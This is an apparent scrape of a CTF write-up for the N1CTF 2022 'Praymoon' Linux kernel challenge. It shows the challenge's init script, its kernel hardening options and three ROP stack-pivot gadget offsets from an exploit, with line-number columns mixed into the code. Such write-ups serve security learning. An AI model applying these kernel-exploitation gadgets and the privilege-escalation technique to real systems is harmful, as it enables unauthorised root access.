# N1CTF 2022 Praymoon Write Up

> 原文: https://www.ctfiot.com/76392.html
> ID: 76392


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
#!/bin/sh

mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs none /tmp
mdev -s
echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
echo 1 > /proc/sys/vm/unprivileged_userfaultfd

insmod /praymoon.ko
chmod 666 /dev/seven
chmod 740 /flag
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
chmod 400 /proc/kallsyms

# poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh

umount /proc
umount /tmp

poweroff -d 0 -f
1
2
3
4
5
6
7
8
9
10
11
12
13
14
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SHUFFLE_PAGE_ALLOCATOR=y

CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""

CONFIG_MEMCG=y
CONFIG_MEMCG_SWAP=y
CONFIG_MEMCG_KMEM=y

CONFIG_DEBUG_LIST=y

CONFIG_HARDENED_USERCOPY=y
1
2
3
4
5
6
7
// push rsi; jge 0x3247e8; jmp qword ptr [rsi + 0x41];
uint64_t stack_pivot_gadget_0 = kernel_base - 0xffffffff81000000 + 0xffffffff811247e6;
// pop rsp; add rsp, 0x68; pop rbx; ret;
uint64_t stack_pivot_gadget_1 = kernel_base - 0xffffffff81000000 + 0xffffffff8134862c;
// add rsp, 0x78; ret;
uint64_t stack_pivot_gadget_2 = kernel_base - 0xffffffff81000000 + 0xffffffff813f643e;
```
